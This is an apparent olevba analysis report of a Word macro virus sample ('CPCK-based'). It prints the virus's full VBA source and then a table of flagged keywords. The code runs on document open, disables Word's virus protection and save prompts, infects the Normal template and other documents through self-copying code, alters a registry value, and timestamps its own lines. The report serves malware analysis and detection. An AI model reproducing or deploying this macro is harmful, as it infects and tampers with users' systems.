olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-052fcd34becc92aa59db4d5d96aeb55a2f8d63b6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-052fcd34becc92aa59db4d5d96aeb55a2f8d63b6 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'11.06.00 14:49:16
On Error Resume Next
'11.06.00 14:49:16
Options.VirusProtection = 0
'11.06.00 14:49:16
Application.EnableCancelKey = 0
'11.06.00 14:49:16
PR96 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'11.06.00 14:49:16
Options.SaveNormalPrompt = 0
'11.06.00 14:49:16
RP60 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'11.06.00 14:49:16
Options.ConfirmConversions = 0
'11.06.00 14:49:16
If PR96 > 0 And RP60 > 0 Then GoTo FF41
'11.06.00 14:49:16
If PR96 = 0 Then
'11.06.00 14:49:16
Set IC52 = ActiveDocument.VBProject.VBComponents.Item(1)
'11.06.00 14:49:16
QP88 = True
'11.06.00 14:49:16
End If
'11.06.00 14:49:16
If RP60 = 0 Then
'11.06.00 14:49:16
Set IC52 = NormalTemplate.VBProject.VBComponents.Item(1)
'11.06.00 14:49:16
ME3 = True
'11.06.00 14:49:16
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "test"
'11.06.00 14:49:16
End If
'11.06.00 14:49:16
If ME3 <> True And QP88 <> True Then GoTo FF41
'11.06.00 14:49:16
If ME3 = True Then IC52.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, PR96 - 1))
'11.06.00 14:49:16
If QP88 = True Then IC52.CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, RP60 - 1))
'11.06.00 14:49:16
With IC52.CodeModule
'11.06.00 14:49:16
For x = 2 To (IC52.CodeModule.CountOfLines - 1) Step 2
'11.06.00 14:49:16
.replaceline x, "'" & Now
'11.06.00 14:49:16
Next x
'11.06.00 14:49:16
End With
'11.06.00 14:49:16
FF41:
'11.06.00 14:49:16
If RP60 <> 0 And PR96 = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'11.06.00 14:49:16
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

